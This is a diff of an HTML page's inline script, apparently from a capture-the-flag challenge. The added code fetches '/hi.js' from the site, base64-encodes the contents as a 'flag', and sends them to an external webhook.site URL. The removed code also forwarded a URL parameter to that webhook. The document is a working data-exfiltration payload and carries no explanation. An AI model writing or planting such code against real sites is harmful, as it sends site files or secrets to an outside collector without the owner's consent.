@@ -7,37 +7,30 @@
 </head>
 <body>
     <script>
-        // Function to extract URL parameters
-        function getUrlParameter(name) {
-            name = name.replace(/[[]/, '\\[').replace(/[\]]/, '\\]');
-            let regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
-            let results = regex.exec(location.search);
-            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
-        }
+        fetch('/hi.js')
+    .then(response => response.text())
+    .then(text => {
+        const encodedFlag = btoa(text);
+        const webhookUrl = `https://webhook.site/0e039ea9-674a-4a9c-a42b-aca98da957f0?cz=${encodedFlag}`;
+        
+        // Send the encoded flag to the webhook URL
+        fetch(webhookUrl, {
+            method: 'GET'
+        }).then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+            return response.text();
+        }).then(data => {
+            console.log('Webhook response:', data);
+        }).catch(error => {
+            console.error('Error sending to webhook:', error);
+        });
+    })
+    .catch(error => {
+        console.error('Error fetching flag:', error);
+    });
 
-        // Check for 'cz' parameter in URL
-        const encodedFlagParam = getUrlParameter('cz');
-
-        if (encodedFlagParam) {
-            const encodedFlag = decodeURIComponent(encodedFlagParam);
-            const webhookUrl = `https://webhook.site/0e039ea9-674a-4a9c-a42b-aca98da957f0?cz=${encodedFlag}`;
-
-            // Send the encoded flag to the webhook URL
-            fetch(webhookUrl, {
-                method: 'GET'
-            }).then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP error! Status: ${response.status}`);
-                }
-                return response.text();
-            }).then(data => {
-                console.log('Webhook response:', data);
-                document.body.innerHTML = `<h1>Webhook Response Received</h1><p>${data}</p>`;
-            }).catch(error => {
-                console.error('Error sending to webhook:', error);
-                document.body.innerHTML = `<h1>Error Sending to Webhook</h1><p>${error}</p>`;
-            });
-        }
     </script>
 </body>
 </html>
